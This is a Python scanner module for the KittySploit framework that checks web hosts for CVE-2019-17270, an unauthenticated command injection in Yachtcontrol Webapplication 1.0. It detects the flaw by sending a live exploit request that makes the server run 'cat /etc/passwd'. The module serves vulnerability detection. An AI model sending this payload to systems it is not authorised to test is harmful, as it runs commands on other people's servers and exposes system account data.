#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Yachtcontrol Webapplication 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Yachtcontrol Webapplication 1.0 - Remote Command Injection Detection',
        'description': 'Yachtcontrol Webapplication 1.0 makes it possible to perform direct operating system commands as an unauthenticated user via the "/pages/systemcall.php?command={COMMAND}" page and parameter, where {COMMAND} will be executed and returning the results to the client. Affects Yachtcontrol webservers disclosed via Dutch GPRS/4G mobile IP-ranges. IP addresses vary due to DHCP client leasing of telco\'s.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'rce', 'yachtcontrol', 'edb', 'packetstorm', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/47760',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-17270',
            'http://packetstormsecurity.com/files/155582/Yachtcontrol-2019-10-06-Remote-Code-Execution.html',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/Elsfa7-110/kenzer-templates',
        ],
        'cve': 'CVE-2019-17270',
    }

    def run(self):
        r = self.http_request(method="GET", path='/pages/systemcall.php?command=cat%20/etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='critical',
                reason="Yachtcontrol Webapplication 1.0 - Remote Command Injection detected",
                path='/pages/systemcall.php?command=cat%20/etc/passwd',
            )
            return True
        return False

